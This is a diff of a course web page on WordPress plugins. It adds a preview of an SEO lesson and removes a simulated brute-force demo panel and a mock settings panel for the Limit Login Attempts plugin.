+          🎉 Session 2 Complete! Your site now has a working contact form and is protected against brute-force attacks.
+          <br><strong>Next Session: SEO Plugin (Yoast) — Help Google find and rank your website!</strong>
+        </div>
+
+        <!-- Next session preview -->
+        <div class="next-session-box">
+          <div class="nsb-title">🔮 Preview — Next Session: SEO Plugin (Yoast)</div>
+          <div class="nsb-body">
+            <div class="nsb-item">
+              <div class="nsb-icon">🔍</div>
+              <div><strong>Install Yoast SEO</strong> — the #1 SEO plugin with 10 million+ installs. Adds an SEO analysis panel to every post and page editor.</div>
+            </div>
+            <div class="nsb-item">
+              <div class="nsb-icon">📝</div>
+              <div><strong>Meta Descriptions</strong> — Write the summary text that appears under your site name in Google search results.</div>
+            </div>
+            <div class="nsb-item">
+              <div class="nsb-icon">🗺️</div>
+              <div><strong>XML Sitemap</strong> — Yoast automatically generates a sitemap.xml file that tells Google what pages to index on your site.</div>
             </div>
           </div>
-
-          <!-- Attack controls + log -->
-          <div class="attack-panel">
-            <div class="ap-controls">
-              <button class="ap-start-btn" id="ap-start" onclick="startAttack()">
-                ▶ Start Bot Attack
-              </button>
-              <button class="ap-stop-btn hidden" id="ap-stop" onclick="stopAttack()">
-                ⏹ Stop Attack
-              </button>
-              <button class="ap-reset-btn" onclick="resetAttack()">
-                ↺ Reset
-              </button>
-            </div>
-
-            <div class="ap-stats">
-              <div class="ap-stat">
-                <span class="as-num" id="stat-attempts">0</span>
-                <span class="as-label">Attempts</span>
-              </div>
-              <div class="ap-stat">
-                <span class="as-num" id="stat-blocked">0</span>
-                <span class="as-label">Blocked</span>
-              </div>
-              <div class="ap-stat">
-                <span class="as-num" id="stat-status">Running...</span>
-                <span class="as-label">Status</span>
-              </div>
-            </div>
-
-            <!-- Attack log -->
-            <div class="attack-log" id="attack-log" aria-live="polite">
-              <div class="al-header">Bot Attack Log</div>
-              <div class="al-entries" id="al-entries">
-                <div class="al-entry al-info">Waiting for attack to start...</div>
-              </div>
-            </div>
-          </div>
-
-        </article>
-
-
-        <!-- ── 4B: LLA Settings reference ── -->
-        <article class="demo-card">
-          <h3 class="demo-card-title">Demo 4B — Limit Login Attempts Settings Panel</h3>
-          <p class="demo-desc">
-            After installing the plugin, configure it at
-            <strong>Settings → Limit Login Attempts</strong>.
-            This is what the settings page looks like:
-          </p>
-
-          <!-- Mock LLA settings panel -->
-          <div class="lla-settings">
-            <div class="lla-title">Limit Login Attempts — Settings</div>
-
-            <div class="lla-field">
-              <label class="lla-label">Allowed retries</label>
-              <input type="number" class="lla-input" value="4" min="1" max="20" id="lla-retries" />
-              <span class="lla-hint">failed attempts before lockout</span>
-            </div>
-
-            <div class="lla-field">
-              <label class="lla-label">Lockout period</label>
-              <input type="number" class="lla-input" value="20" min="1" max="1440" id="lla-lockout" />
-              <span class="lla-hint">minutes</span>
-            </div>
-
-            <div class="lla-field">
-              <label class="lla-label">After</label>
-              <input type="number" class="lla-input" value="2" min="1" max="10" id="lla-lockouts" />
-              <span class="lla-hint">lockouts → extend lockout to</span>
-              <input type="number" class="lla-input" value="24" min="1" max="720" id="lla-extended" />
-              <span class="lla-hint">hours</span>
-            </div>
-
-            <div class="lla-field">
-              <label class="lla-label">Notify on lockout</label>
-              <select class="lla-select">
-                <option>Log only</option>
-                <option>Email admin after 3 lockouts</option>
-                <option>Email admin immediately</option>
-              </select>
-            </div>
-
-            <button class="lla-save" onclick="saveLLASettings()">Save Changes</button>
-            <div class="lla-saved hidden" id="lla-saved">✅ Settings saved!</div>
-
-            <!-- Stats -->
-            <div class="lla-stats-box">
-              <div class="lsb-title">Statistics</div>
-              <div class="lsb-row">
-                <span>Total lockouts today:</span>
-                <strong id="lla-stat-lockouts">0</strong>
-              </div>
-              <div class="lsb-row">
-                <span>Currently locked out IPs:</span>
-                <strong id="lla-stat-ips">0</strong>
-              </div>
-              <div class="lsb-row">
-                <span>Total attempts blocked:</span>
-                <strong id="lla-stat-total">0</strong>
-              </div>
-            </div>
-          </div>
-
-          <p class="demo-note note-green">
-            ✅ With just 4 allowed retries, a bot that tries 10,000 passwords
-            gets blocked after its <strong>4th attempt</strong>.
-            That is a <strong>99.96% reduction</strong> in attack surface — for free, in 2 minutes.
-          </p>
-        </article>
+        </div>
 
       </div>
     </section>
@@ -793,18 +1098,11 @@
 
   </main>
 
-
-  <!-- ============================================================
-    FOOTER
-  ============================================================ -->
+  <!-- ============================================================  FOOTER  -->
   <footer class="site-footer">
-    <p>
-      Web Client Programming &nbsp;·&nbsp; Week 10 Session 02 &nbsp;·&nbsp;
-      Essential Plugins &amp; Contact Forms
-    </p>
+    <p>Web Client Programming &nbsp;·&nbsp; Week 10 Session 02 &nbsp;·&nbsp; Essential Plugins &amp; Contact Forms</p>
   </footer>
 
   <script src="script.js"></script>
-
 </body>
 </html>
